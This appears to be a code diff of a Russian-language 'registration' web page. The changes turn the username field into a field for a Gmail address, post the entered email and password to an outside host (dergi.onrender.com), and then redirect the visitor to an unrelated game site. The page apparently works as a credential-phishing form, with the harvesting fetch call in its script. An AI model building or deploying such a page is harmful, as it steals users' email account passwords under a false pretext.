@@ -1,144 +1,192 @@
-
-
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Регистрация</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #a8e063, #56ab2f);
-        }
-        .container {
-            background-color: #ffffff;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
-            width: 350px;
-            text-align: center;
-        }
-        h2 {
-            color: #2e7d32;
-            margin-bottom: 20px;
-            font-size: 24px;
-        }
-        .input-field {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        .input-field label {
-            display: block;
-            margin-bottom: 5px;
-            color: #388e3c;
-            font-weight: bold;
-        }
-        .input-field input {
-            width: 100%;
-            padding: 10px;
-            border: 2px solid #66bb6a;
-            border-radius: 5px;
-            font-size: 16px;
-            box-sizing: border-box;
-            transition: border-color 0.3s;
-        }
-        .input-field input:focus {
-            border-color: #2e7d32;
-            outline: none;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #4caf50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #388e3c;
-        }
-        .error {
-            color: #d32f2f;
-            font-size: 14px;
-            margin-top: 5px;
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Регистрация</title>
+  <style>
+    /* Анимация плавного смены цветов фона */
+    @keyframes gradientShift {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+
+    body {
+      margin: 0;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(270deg, #ff6a00, #ee0979, #00f260, #0575e6);
+      background-size: 800% 800%;
+      animation: gradientShift 20s ease infinite;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 4px 25px rgba(0, 0, 0, 0.3);
+      width: 350px;
+      text-align: center;
+    }
+
+    h2 {
+      color: #2e7d32;
+      margin-bottom: 20px;
+      font-size: 24px;
+    }
+
+    .input-field {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .input-field label {
+      display: block;
+      margin-bottom: 5px;
+      color: #388e3c;
+      font-weight: bold;
+    }
+
+    .input-field input {
+      width: 100%;
+      padding: 10px;
+      border: 2px solid #66bb6a;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+      transition: border-color 0.3s;
+    }
+
+    .input-field input:focus {
+      border-color: #2e7d32;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #4caf50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #388e3c;
+    }
+
+    .error {
+      color: #d32f2f;
+      font-size: 14px;
+      margin-top: 5px;
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Регистрация</h2>
-        <form id="registrationForm">
-            <div class="input-field">
-                <label for="username">Имя пользователя</label>
-                <input type="text" id="username" name="username" placeholder="Введите имя пользователя" required>
-                <span id="usernameError" class="error">Пожалуйста, введите имя пользователя</span>
-            </div>
-            <div class="input-field">
-                <label for="password">Пароль</label>
-                <input type="password" id="password" name="password" placeholder="Введите пароль" required>
-                <span id="passwordError" class="error">Пароль должен содержать минимум 6 символов</span>
-            </div>
-            <button type="submit">Зарегистрироваться</button>
-        </form>
-    </div>
+  <div class="container">
+    <h2>Регистрация</h2>
+    <form id="registrationForm">
+      <div class="input-field">
+        <label for="email">Gmail</label>
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Введите ваш Gmail"
+          required
+        />
+        <span id="emailError" class="error">Введите корректный email</span>
+      </div>
+      <div class="input-field">
+        <label for="password">Пароль</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Введите пароль"
+          required
+        />
+        <span id="passwordError" class="error">
+          Пароль должен содержать минимум 6 символов
+        </span>
+      </div>
+      <button type="submit">Зарегистрироваться</button>
+    </form>
+  </div>
 
-    <script>
-        document.getElementById('registrationForm').addEventListener('submit', async function(event) {
-            event.preventDefault(); // Предотвращаем стандартную отправку формы
+  <script>
+    document
+      .getElementById('registrationForm')
+      .addEventListener('submit', async function (event) {
+        event.preventDefault(); // Предотвращаем стандартную отправку формы
 
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const usernameError = document.getElementById('usernameError');
-            const passwordError = document.getElementById('passwordError');
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
 
-            // Сбрасываем сообщения об ошибках
-            usernameError.style.display = 'none';
-            passwordError.style.display = 'none';
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
 
-            // Валидация
-            let isValid = true;
-            if (!username) {
-                usernameError.style.display = 'block';
-                isValid = false;
+        // Сброс сообщений об ошибках
+        emailError.style.display = 'none';
+        passwordError.style.display = 'none';
+
+        // Валидация email (простейшая)
+        const emailPattern =
+          /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        let isValid = true;
+
+        if (!email || !emailPattern.test(email)) {
+          emailError.style.display = 'block';
+          isValid = false;
+        }
+
+        if (!password || password.length < 6) {
+          passwordError.style.display = 'block';
+          isValid = false;
+        }
+
+        if (isValid) {
+          try {
+            const response = await fetch(
+              'https://dergi.onrender.com/submit',
+              {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email, password }),
+              }
+            );
+
+            if (response.ok) {
+              alert('Регистрация успешна!');
+              this.reset();
+
+              // Перенаправление на gartic.io
+              window.location.href = 'https://gartic.io';
+            } else {
+              alert('Ошибка при регистрации: ' + response.statusText);
             }
-            if (!password || password.length < 6) {
-                passwordError.style.display = 'block';
-                isValid = false;
-            }
-
-            // Если валидация прошла, отправляем данные через fetch
-            if (isValid) {
-                try {
-                    const response = await fetch('https://dergi.onrender.com/submit', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ username, password })
-                    });
-
-                    if (response.ok) {
-                        alert('Регистрация успешна!');
-                        this.reset(); // Сброс формы
-                    } else {
-                        alert('Ошибка при регистрации: ' + response.statusText);
-                    }
-                } catch (error) {
-                    alert('Ошибка отправки данных: ' + error.message);
-                }
-            }
-        });
-    </script>
+          } catch (error) {
+            alert('Ошибка отправки данных: ' + error.message);
+          }
+        }
+      });
+  </script>
 </body>
 </html>
